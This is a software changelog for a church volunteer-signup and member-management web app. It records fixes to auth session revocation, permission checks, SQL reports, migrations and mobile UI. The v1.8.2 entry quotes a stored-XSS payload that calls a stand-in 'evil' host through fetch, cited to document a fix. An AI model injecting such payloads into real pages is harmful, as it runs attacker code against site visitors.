- **SW3 — No session revocation.** Deactivating a user or changing their role took effect only on next login — an existing session cookie (self-renewing on activity, 8-hour idle timeout) kept working regardless. `getAuthInfo()` now does a live `active`/`role` lookup against `app_users` for any cookie carrying a username, returning the *current* DB role instead of trusting the cookie's baked-in value, and rejecting outright if the account is deactivated or deleted. Env-var/break-glass admin sessions (no username, no DB row) are unaffected — rotate `ADMIN_PASSWORD` to revoke those, per the existing LP8 convention. Verified with a standalone mock-DB test: deactivation and role changes both take effect on the very next request, no re-login required. (`src/auth.js`)
- **SW4 — Households API silently got the wrong permission flag.** `api-chms.js` called `handleHouseholdsApi(...)` with 10 arguments; the function only declared 8, so `isFinance`'s value landed in the `canEdit` parameter slot instead of the real `canEdit`. Effect: **staff-role users were wrongly denied** on `households/:id/use-member-photo` and `households/:id/apply-photo-to-members` (fails closed, not a security hole). Fixed the call site to match the actual signature. Verified with a role-flag simulation confirming staff now correctly gets `canEdit=true`. (`src/api-chms.js`)
- **SW5 — Volunteer outreach emails always sent blank template variables.** `volOpenSendEmail`'s signup-ID lookup compared a DOM `dataset` string against a numeric cache ID with `===` — never matched, so `{{roles}}`/`{{service}}`/`{{sundays}}`/`{{notes}}` silently rendered empty in every outgoing email. Fixed by parsing the dataset value to a number before comparing. (`src/frontend/js-volunteers.js`)
- **SW6 — Giving by Fund report silently dropped active funds with $0 given in the period**, instead of showing them at $0 — the date-range filter lived in the outer `WHERE` clause, which downgrades a `LEFT JOIN` to an `INNER JOIN` for any fund with no matching rows. Moved the date filter into a subquery joined against all active funds, so a zero-activity fund now correctly appears with `contributions:0, total_cents:0`. Verified against a real local D1 instance with a zero-activity fund that the old query dropped entirely and the new query correctly includes. (`src/api-reports.js`)
- **SW7 — Acceptance ministry's driving-availability answers were captured but never shown back to the user** in the "Confirm & submit" read-back step (VUX3's whole point) — they were silently folded straight into a notes field. `goToStep3()` now renders a "Interested in driving?" summary block (services attended, availability, wheelchair-accessible, capacity) when any of those fields were filled in, using a new shared `getAccTransFields()` helper also used by the final submit handler (previously duplicated field-reading logic in both places). (`src/public/scripts.js`)
- **SW8 — Deceased filter + anniversary/deceased-partner data-quality audit + new dashboard card.** `sendBirthdayTexts()` was missing the `(deceased=0 OR deceased IS NULL)` filter present on all three sibling send functions — fixed. Separately, audited the anniversary pairing logic (`sendAnniversaryEmails`/`sendAnniversaryTexts`/the DB4 dashboard card): all three silently skip anyone whose household has no living, date-matched head/spouse partner — meaning a person whose spouse died, or whose partner's anniversary_date is missing/wrong, gets **zero** acknowledgment with no visibility anywhere that this happened. New year-round (not date-scoped) audit in the dashboard endpoint classifies every anniversary-eligible person into `deceased_partner` / `no_partner` / `date_mismatch` when applicable, and a new "Anniversary Data Issues" dashboard card (editors+, on by default, toggleable via the existing Customize Dashboard prefs) lists them with the reason and a link to the profile — surfacing both a data-quality issue (missing/mismatched partner data) and a pastoral-care opportunity (deceased partner) that were previously invisible. Verified the classification logic against four real scenarios (matched couple / deceased partner / no partner / mismatched date) via a real local D1 query plus a standalone logic simulation. (`src/api-emails.js`, `src/api-chms.js`, `src/frontend/js-dashboard.js`)
- Verified all 3 served `CHMS_HTML` script blocks and the public `scripts.js` script block still parse; `npx vitest run` (37 tests) still passes throughout.

### 2026-07-11 (v1.8.6 — backlog cleanup: FH4, FH6, RI2, BUG2, SC5)
- **FH4, FH6, RI2 — closed as stale duplicate entries.** All three had already been fixed in earlier sessions (FH4/PR2 in Phase 16, FH6/RI2 under the Auth/Login queued items), but the original backlog line under Phase 12 / Reports-Insights was never checked off, so they kept showing as open. Re-verified all three directly against current code (bulk-tags single round-trip, PATCH sparse updates, Breeze sync + `db.js` backfill for baptized/confirmed) before closing — no code changes needed, CLAUDE.md corrected.
- **BUG2 — re-traced, partial fix.** The prior "Partial" fix diagnosed the root cause as "no real provider configured," but `validateAddressCore()` already has a free Census fallback (no key needed) that shouldn't hard-fail — so that diagnosis doesn't fully explain a bare error. Along the way, found and fixed a real, separate mislabeling bug: when the Census fallback runs, the UI said "Address not found by **USPS**" even though USPS was never queried. New shared `validateAddrResultMsg()` helper (used by both `validatePersonAddress()` and `validateContactAddress()`, replacing duplicated ternary logic in each) labels Census-sourced results correctly and points at the actual fix (add a USPS/Lob key). Could not reproduce the original hard-error report — this session has no network path to census.gov/USPS/Lob to observe a live failure. If it recurs, the now-more-specific error text should make it fast to diagnose. (`src/frontend/js-people.js`)
- **SC5 — full resync.** `scheduler/index.html` (design-reference copy, not served) was regenerated from `src/scheduler-html.js` by evaluating the `SCHEDULER_HTML` module and writing the resulting *served* string verbatim — not copying the raw template-literal source, which still carries doubled backslashes meant to collapse during that evaluation (the exact class of bug from SC3-BUG1/BUG2). This closes the ~278-line drift (missing email-template functions) noted after the last partial sync. Confirmed the extracted `<script>` block parses via `node --check`. (`scheduler/index.html`)
- Verified all 3 served `CHMS_HTML` `<script>` blocks still parse and `npx vitest run` (37 tests) still passes.

### 2026-07-11 (v1.8.5 — Phase 19 follow-ups REV6/REV8)
- **REV6 — Ministry Roles collapse no longer hides the selected role silently** (`src/frontend/js-volunteers.js`, `html-head.js`). Since v1.8.1 removed the "keep the active role's group expanded" guard, collapsing a group that contained the currently-selected/edited role hid its row with zero indication. `volRenderMRolesList()` now computes `hasActive` per group (only meaningful while collapsed, since search always force-expands) and renders a small teal dot + `title` tooltip on that group's header when it's true — a lightweight signal that the selection is still there, just tucked away, without reverting the "let admins collapse every group, including the active one" behavior they explicitly asked for.
- **REV8 — `npm audit fix`** on dev dependencies. `wrangler` picked up a routine `^4.84.1`-range bump (4.84.1 → 4.110.0, no `package.json` change needed) that resolved all 6 advisories (esbuild/undici/vite/ws, all local-dev-only — no production runtime exposure since this app deploys via Cloudflare Workers, not a served Node process). `npm audit` now reports 0 vulnerabilities. Verified `npx vitest run` (37 tests) and a `wrangler d1 execute --local` smoke test both still work post-bump.
- Verified the served `CHMS_HTML` script blocks still parse and the new dot-indicator logic renders correctly for the exact "select a role, then collapse its group" scenario the review flagged.

### 2026-07-11 (v1.8.4 — Phase 19 follow-up REV5)
- **REV5 — friendly 409 on the event slug uniqueness race** (`src/api-admin.js`). The create/update event endpoints already pre-check slug uniqueness before writing, but that leaves a TOCTOU window: if two requests race, both pre-checks can pass and the loser's `INSERT`/`UPDATE` then trips the DB's own unique partial index (`idx_serve_events_slug`), which was previously an uncaught exception falling through to the generic 500 handler. Both writes are now wrapped in a try/catch that recognizes a `UNIQUE constraint` failure (only when a slug was actually being set) and returns the same friendly `"That short link is already used by another event"` 409 the pre-check already returns for the non-race case; any other error still rethrows to the existing 500 handler unchanged. Verified against a real local D1 instance with two genuinely racing inserts (not just code inspection) — confirmed the winner gets `{ok:true}` and the loser gets the 409.

### 2026-07-11 (v1.8.3 — Phase 19 follow-ups REV4/REV7)
- **REV4 — slug validation gaps closed** (`src/api-admin.js`). `normalizeSlug()` now caps the result at 64 chars to match the worker's route-matching regex (previously a longer slug saved fine but its short link could never match and silently 404'd). Added a `RESERVED_SLUGS` denylist (`scheduler`, `chms`, `portal`, `admin`, `api`, `rsvp`, `volunteer`, `email`, `member`) checked before the uniqueness check on both the create and update event endpoints, returning a friendly 409 — closes the gap where an event slug of e.g. `scheduler` could shadow the real `/scheduler` route on the public site.
- **REV7 — stale dropdown option removed** (`src/frontend/html-tabs.js`). Dropped the leftover `transportation` `<option>` from the Outreach Email Templates ministry filter — the ministry itself was folded into Acceptance in v1.8.0; this dropdown just hadn't been touched since.
- Verified the served `CHMS_HTML` script blocks still parse (`node --check` on all 3 extracted `<script>` bodies) and `npx vitest run` (37 tests) still passes.

### 2026-07-11 (v1.8.2 — code review fixes, 3 of the highest-severity findings)
- **Full-diff code review of everything since CLAUDE.md's Queued Items were last updated** (through v1.7.3/e21be47) — 4 parallel review passes over the v1.7.0–v1.8.1 mobile-landing redesign, event short-link feature, scheduler escaping-bug history, and the Transportation→Acceptance migration. Found and fixed the 3 highest-severity issues; the rest are logged below in Queued Items as **Phase 19**.
- **Fixed: stored XSS in the event short-link "Sign Up" button** (`src/public/scripts.js`). The button's `onclick` attribute embedded the event name via `escH()` (HTML-entity escaping) inside a JS-string-literal context — but the browser HTML-decodes an inline event-handler attribute *before* compiling it as JS, undoing the entity escaping and re-introducing a literal `'`. Verified in Node that a crafted event name (e.g. containing `');fetch('https://evil/...);//`) survives decode-then-parse and executes arbitrary JS against every visitor of that event's page; an ordinary apostrophe in a name (“St. Nick's Market”) silently broke the button. Same bug class as the previously-fixed VUXBUG2 (quote-context mismatch in an inline `onclick`). Fixed by switching to the same delegated `data-*` + document-level click-listener pattern already used for `[data-nav-page]` navigation in this file — the event name now only ever flows through `el.dataset.eventName` (a plain string read, never re-parsed as code). Verified the served script (evaluated through its outer template literal, not just eyeballed) still parses cleanly and that the crafted payload above is now inert.
- **Fixed: no role guard on event / ministry-role write endpoints** (`src/api-admin.js`). `POST/PUT/DELETE /admin/api/events`, `/admin/api/events/:id/roles`, and `/admin/api/ministry-roles` had no role check beyond the blanket "is logged in" gate — any authenticated role, including `member` (documented elsewhere as read-only), could create/edit events and roles. This was the reachability path that made the XSS above exploitable by a low-privilege account, and (separately) meant any account could set an event slug that shadows `/scheduler` on the public site. Added `isStaff`-equivalent (`admin`/`staff`) guards to all six write routes, matching the role-check convention used elsewhere in this file. Also removed `transportation` from the `ministry-roles` POST allowlist (`VALID_MIN`) while touching that line — the admin UI dropdown already dropped it in v1.8.0, but the API itself still accepted it, allowing creation of an orphaned role with no public page to render on.
- **Fixed: duplicate Ministry Roles rows from the v1.8.0 Transportation→Acceptance migration** (`src/db.js`). `_doInitDb` ran `seedMinistryRolesFromStatic()` *before* the `UPDATE ministry_roles SET ministry='acceptance' WHERE ministry='transportation'` reclassify statement. Since `MINISTRY_ROLES_SEED` was changed in the same deploy to tag those 3 driving roles `acceptance` directly, any database that still had them as `transportation`-tagged (i.e. prod, since the seed-under-transportation deploy and this reclassify deploy landed back-to-back) hit the seed's `NOT EXISTS(ministry='acceptance' AND name=...)` guard, found nothing yet, inserted 3 new rows — and *then* the UPDATE reclassified the original transportation-tagged rows too, leaving 6 duplicate rows instead of 3. Reproduced and confirmed against a real local D1 (SQLite) instance via `wrangler d1 execute --local`, not just static reasoning. Fixed by reordering (UPDATE now runs first, so the seed's dedup check sees the reclassified row and correctly skips re-inserting), plus a one-time self-healing DELETE appended to `_doInitDb` that collapses any already-created duplicates down to the earliest-created row per name (safe: `ministry_roles.id` is never referenced as a foreign key elsewhere — signups store the role *name* as their checkbox value). New `migrations/0013_dedupe_transportation_acceptance_roles.sql` for the historical record; the fix self-applies on the next Worker cold start in any environment, no manual DB command needed. Verified the full before-fix→after-fix sequence (bug reproduction, dedup cleanup, and confirmation the fixed ordering never creates the duplicate in the first place) against a scratch local D1 database.

### 2026-07-10 (v1.8.1)
- **Admin Ministry Roles group headers can now all be collapsed at once**: since v1.6.1, the group containing the currently-selected role was force-kept expanded (`!hasActive` guard in `volRenderMRolesList()`) so selecting a role never hid it — but that meant there was always at least one section you couldn't collapse. Removed that guard; every group (Worship, Christian Ed, Acceptance, Outreach, General) now collapses independently regardless of which role is selected. Search still force-expands matching groups as before. (`src/frontend/js-volunteers.js`)

### 2026-07-10 (v1.8.0 — Transportation folded into Acceptance)
- **Transportation is no longer its own top-level ministry** — per request, it's now a sub-category of Acceptance (Care Ministry), since driving people to worship is fundamentally a form of welcoming/caring for them. Concretely:
  - The 3 Transportation roles (Regular Sunday Driver, Special-Occasion Driver, Ride Coordinator) are re-tagged `ministry='acceptance'` — both in `MINISTRY_ROLES_SEED` (`src/db.js`, for fresh installs) and via a new cold-start `UPDATE ministry_roles SET ministry='acceptance' WHERE ministry='transportation'` (same file, plus `migrations/0012_*.sql` for the historical record) so any already-deployed transportation roles get reclassified too, not just newly-seeded ones. They now show up mixed into the Acceptance page's role-grid alongside Stephen Ministry etc.
  - Removed the standalone Transportation page (`src/public/ministries/transportation.js`, deleted), its landing-page row, its entry in the dynamic-role-loading list, its `MR_MINISTRY_LABELS` admin dropdown option (so staff can't re-create a role under the old category going forward), and the now-dead `.card.transportation`/`.mrow.transportation`/`.ministry-header.transportation`/`.value-tile.v-transportation` CSS.
  - Transportation's driving-specific questions (which services you attend, driving availability, wheelchair-accessible vehicle, passenger capacity) weren't dropped — they're now an optional "Interested in driving?" section within the Acceptance sign-up form (`acc-trans-*` ids), folded into the submission's notes field only when actually filled in (so a Stephen Ministry sign-up doesn't get a stray "wheelchair-accessible: no" line).
  - **Found a real bug while wiring the submission logic up**: the plain `#acc-volunteer-form .btn-submit` click listener (same pattern used for every `_STEP_CFGS` ministry — worship/education/acceptance/outreach/lasm/wol/cfna) is already dead code today, confirmed by `initStepForms()`'s own comment ("Remove old submit button (dead code path, but clean up)") — that function tears down the static single-step form and rebuilds a 3-step wizard at runtime, so the *real* submit path is the step-3 "Confirm sign-up" handler built dynamically inside `initStepForms()`. My first pass wired the driving-fields logic into the dead listener and it silently never ran; moved it into the actual step-3 handler (special-cased on `m === 'acceptance'`) instead. Left the harmless dead listener as-is (matches the pattern already present for every other ministry — not in scope to clean up here).
  - Verified end-to-end with a headless-browser walkthrough: role-grid on the Acceptance page shows the reclassified driving roles, the landing page no longer lists Transportation, and — the part that actually matters — clicking through the real 3-step wizard (Next → select a role → Review & Continue → Confirm sign-up) produces a `POST /volunteer/signup` payload with `ministry:"acceptance"` and the driving answers correctly folded into `notes`.

### 2026-07-10 (v1.7.5)
- **Short-link field placeholder now guesses from the event's own name** instead of always showing the same hardcoded "christmasmarket" example regardless of which event you're editing (confusing on a live screenshot — looked like a ghost value, not an example). New `volSuggestSlug(name)` lowercases and strips the event name to letters/digits only, matching the site's existing single-word slug convention (`christmasmarket`, `foodpantry`); falls back to an empty placeholder for an unnamed event. (`src/frontend/js-volunteers.js`)

### 2026-07-10 (v1.7.4)
- **Footer logo restored too**: the v1.7.1 logo fix only covered the sticky top bar and the drawer's brand mark — the footer's generic circle+cross placeholder (pre-existing, present since before the v1.7.0 redesign, so it wasn't caught by that fix) was still there on every page. Swapped it for the same `/header-logo.png` image the header and drawer already use. (`src/public/footer.js`, `src/public/head.js`)

### 2026-07-10 (v1.7.3)
- **Transportation Ministry converted to dynamic role cards**: the public Transportation page was a single flat "sign up to drive" interest form built before the VUX13 dynamic Ministry Roles system existed — it had no `role-grid`, wasn't in `navigate()`'s dynamic-role-loading list, and had zero rows in `ministry_roles`, so the admin Ministry Roles tab had nowhere to show or edit it (a ministry group only renders once it has ≥1 role). Seeded 3 default roles (Regular Sunday Driver, Special-Occasion Driver, Ride Coordinator) into `MINISTRY_ROLES_SEED`, added an empty `.role-grid` + "Selected roles" preview to `src/public/ministries/transportation.js` matching the Worship/Education/Acceptance/Outreach pattern, added `transportation` to `showPageAndLoad()`'s dynamic-role-loading ministries and to `updatePreviews()`'s `syncPreview` calls, and wired the submit handler to read checked role checkboxes instead of a hardcoded empty array. Deliberately did *not* add Transportation to `_STEP_CFGS` (the multi-step contact-first wizard) — its extra custom fields (service/availability chips, wheelchair-accessible radio, vehicle capacity) don't fit that generic flow, so it stays a single-page form, just with admin-editable role cards now. Verified end-to-end with a local mock server + Playwright: roles render, checkbox selection updates the preview, and the built `PUBLIC_HTML`/`CHMS_HTML` script blocks all still parse. (`src/db.js`, `src/public/ministries/transportation.js`, `src/public/scripts.js`)
- **Fixed a regression of the SC3-BUG1 syntax-error class, found incidentally while verifying the above**: `src/scheduler-html.js` had 7 new occurrences of the same bug documented as fixed in the 2026-07-07 (v1.6.6) entry — single-backslash-escaped `\'Source Sans 3\'` / `\'Lora\'` / `here\'s` inside `SCHEDULER_HTML`'s outer template literal, which gets consumed at module-load time and emits a bare `'` into the served script, breaking the whole embedded `<script>` block at parse time (confirmed via `node --check` on the extracted script, and confirmed it was already broken on `main` before any of this session's changes — a genuine live production bug, not something this session introduced). Likely reintroduced by newer email-template functions (open-slot notification, weekly reminder) added after the original fix without carrying the lesson forward. Fixed all 7 by doubling the backslash, same as before. **`scheduler/index.html` was not resynced this pass** — it's now further behind `scheduler-html.js` than just this fix (missing several newer email-template functions entirely); a full resync is a separate follow-up. (`src/scheduler-html.js`)
- **Note**: `DEPLOY_VERSION` in `src/frontend/js-core.js` was still `1.6.9` on `main` despite NOTES.md documenting up through v1.7.2 — the last few sessions' PRs didn't bump it. Corrected to `1.7.3` here to realign code with docs.

### 2026-07-09 (v1.7.2 — found the back button, added event short links)
- **Removed the "← Back" pill** from the top of the Community Events list page (`src/public/ministries/events.js`) — this is what the "sticky floating back button" report from v1.7.1 turned out to be (confirmed via a screenshot). It wasn't actually fixed-position, just the only lone button on that page with nothing else in its row, which read as an out-of-place floating element. The hamburger drawer already provides Home navigation, so this was redundant. The `.back-link-plain` "← Community Events" link on individual event pages is unaffected — that one's contextual to a specific event and stays.
- **Admin-managed event short links**: every event can now optionally get a memorable URL (e.g. `volunteer.timothystl.org/christmasmarket`) instead of only the bare `#event-<id>` link from v1.7.1, set from the Events tab's detail pane (new "Short link" field, with a "Copy link" button once one's saved).
  - New `serve_events.slug` column (`migrations/0011_event_slug.sql` + the matching runtime cold-start ALTER in `src/db.js`, per this repo's dual-migration convention), unique among non-empty values via a partial `CREATE UNIQUE INDEX ... WHERE slug != ''` — verified the DB itself enforces this as a backstop (`SQLITE_CONSTRAINT_UNIQUE`) even if the app-level pre-check were ever bypassed.
  - `tlc-volunteer-worker.js` gets a narrow new route: a bare single-segment lowercase-alphanumeric-hyphen path (allowlist regex, not a general SPA catch-all) is checked against `serve_events.slug` and 302-redirects to `/#event-<id>` if it matches; otherwise the request falls through unchanged to whatever handled it before (still eventually a 401/404, same as today — not in scope to fix that separately). Placed before the scheduler's `schedAuthed` gate so public unauthenticated visitors can actually use it, and gated to `!isChmsHost` so it can't shadow anything on chms.timothystl.org.
  - `src/api-admin.js`'s event create/update endpoints accept `slug`, normalize it (`toLowerCase()`, strip to `[a-z0-9-]`, matching the worker's route regex and the existing username-normalization convention in this same file), and pre-check uniqueness with a friendly 409 instead of a raw constraint error.
  - Verified locally with `wrangler dev --local`: cold start auto-adds the `slug` column and unique index, `GET /api/events` returns the new field, setting a slug via direct D1 write and requesting `/christmasmarket` 302s to `/#event-3` correctly, and a second event claiming the same slug hits the unique constraint as expected.
  - Deliberately did **not** add a slug field to the quick "+ New" event form — it's optional and can be set from the detail pane right after creating the event, keeping that quick-create flow uncluttered.
- **Manual step for whoever deploys this**: none — the `slug` column self-applies via the existing cold-start migration safety net in `src/db.js`, same as `signups.status` and every other column added since IN7. The `migrations/0011_*.sql` file is just the historical record.

### 2026-07-09 (v1.7.1 — post-launch fidelity fixes on v1.7.0)
- **Real church logo restored**: v1.7.0's sticky top bar dropped the site's real logo image entirely (text-only, matching the mockup's simplified reference) and the new drawer used a generic circle+cross SVG as a placeholder brand mark. Feedback after launch: bring the real logo back in both places. Rather than re-inlining the original ~115KB base64 PNG that used to live directly in `PUBLIC_HEAD` (bloating every single page load), the exact original logo bytes are now served from a new cached `/header-logo.png` worker route — same proxy-from-repo-with-`cacheEverything` pattern already used for `/favicon.svg` and `/icons/*`. Referenced via a normal `<img>` in the sticky bar and the drawer's brand mark. (`tlc-volunteer-worker.js`, `header-logo.png` new file, `src/public/head.js`)
- **Every event now has its own directly-linkable page** (`#event-<id>`), not just the non-shift ones from v1.7.0. Previously, shift-based events (Christmas Market) still expanded inline in the Community Events list — feedback was that all events should open their own page, and that page should be shareable without navigating Home → Events → tap. `renderEventDetailPage(ev)` now renders either the shift day/picker (`renderEventExpanded`, unchanged) or the simple role checklist into the same shared page container depending on `isTimeSlotted(ev)`; `openEventPage(evId)` fetches `/api/events` if it isn't already loaded (so a cold link works, not just a click from the list) and pushes/replaces `#event-<id>` in the URL. `navigate()`, the `popstate` handler, and the initial hash-restore all special-case that URL pattern now. The now-fully-inline accordion body (`ev-roles-dyn-*`) and `toggleDynEvent()` are gone — every event card in the list just opens its page. (`src/public/scripts.js`)
  - **Bug caught while building this**: the checkbox `.selected`-state listener for shift slots was scoped to a `change` listener attached directly on `#dynamic-events-container` — fine when shifts only ever rendered inside that container, but broken once they can render on the standalone event-detail page too. Moved to the same global delegated `change` listener already used for ministry-page role cards and simple-event role checkboxes; `updateShiftCount()` now takes an event ID (parsed straight from the checkbox's `name="ev-slot-<id>"`) instead of a container element, so it doesn't care which page it's rendered on.
  - **Second, unrelated bug caught while verifying the above with a headless-browser deep-link test**: `#event-<id>` links were silently redirecting to the landing page — `location.hash` was reading back with the fragment intact, but the routing regex (`/^event-(\d+)$/`) never matched. Root cause was the exact bug class already documented in this file's v1.6.6 entry: a single `\d` inside the outer `PUBLIC_SCRIPTS` template literal gets consumed as an (invalid, silently-dropped) escape sequence when the outer file is evaluated at Worker cold start, so the *served* script actually contained `/^event-(d+)$/` — a literal "d", not a digit class. Grepping for the same pattern turned up two more live instances in `parseTimeToMinutes()` (`/^(\d{1,2}):(\d{2})\s*(am|pm)$/i` and its 24-hour sibling) — meaning the Christmas Market shift picker's "Sort by Time" has never actually sorted by time in production, silently falling through to `0` for every shift. All three fixed by doubling the backslash (`\\d`, `\\s`) so the outer template literal re-emits the literal escape into the served script. Verified via `node --check` on the extracted `<script>` body (per the v1.6.6 lesson) plus an end-to-end headless-browser check confirming shift groups now sort earliest-time-first.
- Re-verified with headless Chromium (mobile viewport, `/api/events` + `/header-logo.png` route-mocked): logo renders in both the sticky bar and drawer, clicking either event type from the list lands on its own page with the correct `#event-<id>` URL, and — critically — loading that URL fresh in a brand-new page/context (no prior click) renders the correct event directly. `npx vitest run` (37 tests) still passes.
- **Not yet resolved**: a reported "sticky floating back button" that "crept back in" — could not locate any fixed/sticky-positioned back button anywhere in the public site's CSS or markup (checked `position: fixed`/`position: sticky` across every rule in `head.js`, plus all inline styles in `scripts.js`/`events.js`); the only sticky element at all is the new top bar itself, which isn't a back button. Flagged back to the requester for a screenshot or more specific location rather than guessing and removing the wrong thing.

### 2026-07-08 (v1.7.0 — mobile landing redesign)
- **Volunteer site mobile landing redesign**: implements the `design_handoff_volunteer_mobile` package (screens 01–05) — the previous full-height text hero pushed the "See where you can help" CTA below the fold on phones, so the redesign fixes that plus adds sitewide navigation and reworks the events flow.
  - **Sticky top bar + hamburger drawer** (new): replaced the old plain `<header>` (logo/tagline/address) with a slim sticky navy bar (church name + hamburger, address shown inline on wider screens) and a right-side slide-in drawer (Home, Get Involved: Worship/Christian Education/Acceptance/Outreach, Community Events, Partner Ministries — scrolls to that landing-page section — and I Just Want to Help). Backdrop click, X, and Escape all close it; body scroll is locked while open. (`src/public/head.js`, `src/public/scripts.js`)
  - **Photo hero** (landing page only): replaced the solid-navy text hero with a photo layer (gradient placeholder box + dashed caption — swap for a real photo before shipping) under a bottom-anchored navy scrim, eyebrow/headline/subhead, and a solid gold CTA button — all above the fold on a typical phone. (`src/public/landing.js`, `src/public/head.js`)
  - **Compact ministry rows**: the landing page's "Timothy Lutheran Church" and "Partner Ministries" sections changed from large paragraph cards to a scannable single-line row list (icon, name, one-line description, chevron, colored left border) — same nav targets/icons/colors as before, just restyled. 2-column grid on wider screens. (`src/public/landing.js`, `src/public/head.js`)
  - **Community Events: shift vs. simple events now route differently**. Events with day/shift data (Christmas Market) still expand in place with the existing day-toggle/shift-picker. Events with no shift data (Easter Egg Hunt, VBS) now navigate to a **new dedicated page** (`#page-event-simple`) with its own left-aligned hero (back link, date, title, description), a reused contact-info card, a compact single-column role checklist (no description text, matches the mockup), and a gold Sign Up button — replacing the old always-inline accordion body for these events. Fixed a pre-existing gap along the way: simple-event role checkboxes (`ev-role-*`) never got the `.selected` visual toggle the static ministry-page role cards get; broadened the existing change-listener to cover both. (`src/public/ministries/events.js`, `src/public/scripts.js`)
  - Adapted the same visual language to desktop (not just mobile, per follow-up request): taller sticky bar with inline address ≥700px, taller hero, drawer widens to 340px, ministry rows go 2-column ≥760px.
  - Verified with a static Playwright render (headless Chromium, mobile 390px + desktop 1440px viewports, `/api/events` mocked via route interception): hero renders without overlapping the photo placeholder, hamburger opens/closes the drawer, Community Events list shows both event types, Christmas Market expands inline correctly (pre-existing behavior unaffected), Easter Egg Hunt navigates to the new dedicated page with working checkbox selection and back link. `npx vitest run` (37 tests) still passes — none of the touched files have unit test coverage, this was existing backend coverage confirming no collateral breakage.
  - Found and fixed one authoring bug caught by this same Playwright pass: a naive `indexOf('</div>')` used while swapping the old ministry-card markup for the new compact rows didn't account for nested `<div class="card-icon">` elements, which briefly caused `#page-landing`'s own closing tag to be dropped (nesting every other page inside it). Fixed with proper tag-depth tracking before this shipped.

### 2026-07-08 (v1.6.9)
- **Removed Signups ministry filter pills**: the "All / Worship / Events / Education / Acceptance / Outreach / General" pill row above the Signups list (`#vol-ministry-tabs`) is gone per request — it was adding clutter above the status pills (New/Contacted/Confirmed), especially on mobile where it pushed the actual signup list far down the page. Removed the button row from `html-tabs.js` and the now-dead `volSetTab()` handler from `js-volunteers.js` (its only callers were those buttons). The Signups list always shows all ministries now; `VOL_MINISTRY_LABELS` and the status-pill filter (`volSetStatusFilter`) are untouched — ministry is still shown per-row and is still filterable ministry-by-ministry via the Ministry Roles tab. (`src/frontend/html-tabs.js`, `src/frontend/js-volunteers.js`)

### 2026-07-07 (v1.6.8)
- **Admin Volunteers tab smashed on mobile**: the VUX11 left-side navy sub-nav (Signups/Ministry Roles/Events/Templates) was a fixed 170px-wide rail sitting in a plain `display:flex` row next to the content pane, with no mobile breakpoint — the exact pattern the outer app sidebar (VUX10) was fixed for, but never applied to this newer inner rail. On a phone the rail alone ate ~200px of a ~375px viewport, leaving almost no room for the content, which read as everything crushed together. Fixed by moving the rail's inline styles to a real `.vol-subnav` class (plus `.vol-shell` on the outer row and `.vol-content-pane` on the content pane) and adding a `@media(max-width:700px)` block that stacks the shell into a column and turns the rail into a horizontal scrollable pill row above the content, matching the existing `reg-add-toggle`/`.ev-master-detail` stacking conventions already used elsewhere in the app. Also fixed a compounding bug: the Ministry Roles list column had an inline `style="width:290px"` that silently defeated the *existing* `@media(max-width:720px){.ev-list-col{width:100%}}` rule (inline styles beat media-query class rules) — moved to a `.ev-list-col-wide` class defined before that media query so the responsive override still wins at narrow widths. Verified with a static Playwright render at 390px width (Signups pill row + Ministry Roles panel both confirmed full-width and readable). (`src/frontend/html-tabs.js`, `src/frontend/html-head.js`)

### 2026-07-07 (v1.6.7)
- **Focus Week polish, 3 requested tweaks**: (1) The Focus Week rail now defaults its selection to the next upcoming Sunday/service (today or later) instead of always the first row of the month — new `focusWeekDefaultIdx()` helper, applied at every point `loadSchedule()` succeeds (initial tab load, month switch, data import). Falls back to the last row if the whole viewed month is in the past. (2) Removed the per-person initials avatar bubble from role-assignment rows in the Focus Week detail pane (`buildRoleRowHtml`) — it added visual noise with no extra information beyond the name text already shown; `avatarHtml()` is left in place for its other callers (People "By Role" list, role-picker popover). (3) Lectionary sub-labels now read "(Proper 10)" instead of the raw LCMS code "(prop10)" — `fmtSundayName()` now reinterprets the code instead of stripping it, and `getLectEntry()` applies it once so every call site gets the human-readable form automatically. Mirrored into `scheduler/index.html` per the SC3 sync requirement. (`src/scheduler-html.js`, `scheduler/index.html`)

### 2026-07-07 (v1.6.6)
- **Scheduler still not rendering after v1.6.3/v1.6.4/v1.6.5 — root cause found**: none of the prior three fixes could have worked because the entire scheduler `<script>` block was failing to *parse* in the browser, so none of that JS ever ran at all (not even the try/catch blocks meant to catch runtime errors — this was a load-time `SyntaxError`, which Chrome's DevTools **Issues** panel does not surface; only the **Console** tab shows it, and even then it just prints as `Uncaught SyntaxError: Unexpected identifier 'Source'` with no useful stack). Root cause: `src/scheduler-html.js` defines `SCHEDULER_HTML` as a JS template literal (backticks) containing an embedded `<script>...</script>` as plain text. Several email-building functions (`buildHtmlEmail`, `buildVolunteerRequestHtml`, `_sendWeekReminders`) wrote inline `font-family:'Source Sans 3'` / `font-family:'Lora'` CSS inside single-quoted JS strings, escaped as `\'Source Sans 3\'`. A **single backslash** inside a JS template literal *is* a real escape sequence — it gets consumed when the outer file is parsed/evaluated (at Worker cold start / module load), producing a bare `'` in the served HTML instead of `\'`. That broke the *inner* (served) script's own string literal the moment the browser tried to parse it — same bug as writing `'foo'bar''` — which is a hard `SyntaxError` that aborts the entire `<script>` block, including the `window.schedInitScheduler` definition prepended by `src/scheduler-inline.js`. Confirmed via `node --check` on the extracted embedded `<script>` content (not previously done — earlier sessions relied on runtime `try/catch` reasoning and the browser Issues panel, both of which are blind to this class of bug). Fixed all 7 occurrences by doubling the backslash (`\\'Source Sans 3\\'`, `\\'Lora\\'`, `here\\'s`) so the outer template literal correctly re-emits a literal `\'` into the served script. Verified via a headless-browser probe against the actual built `CHMS_HTML` output: `window.schedInitScheduler` is now defined, `_schedInited` becomes `true`, and `#fw-rail`/`#fw-detail` populate on tab load. **Lesson for future scheduler debugging**: run `node --check` against the extracted `<script>` bodies of the built `CHMS_HTML`/`SCHEDULER_HTML` output *before* reasoning about runtime logic — a parse error upstream makes all downstream runtime fixes inert. (`src/scheduler-html.js`)

### 2026-07-07 (v1.6.5)
- **Scheduler calendar still not visible after v1.6.4**: The v1.6.4 fix set `schedule-output.style.display='block'` inside the `try` block of `d1Pull()` and the INIT block — meaning if `renderFocusWeek()` threw, the display set never ran (the catch silently swallowed it). Two-part fix: (1) In `_build()` in `src/scheduler-inline.js`, strip `style="display:none;"` from `#schedule-output` directly in the transformed HTML — the element is unconditionally visible from the moment the DOM is built, with zero JS dependency. (2) In `schedInitScheduler`, add a synchronous try/catch block (before any async fetch) that calls `renderFocusWeek()` and sets `schedule-output.style.display='block'` — so the empty state appears immediately when the user clicks the Scheduler tab. The `schedule-output` element is still revealed even if `renderFocusWeek()` throws. (`src/scheduler-inline.js`)

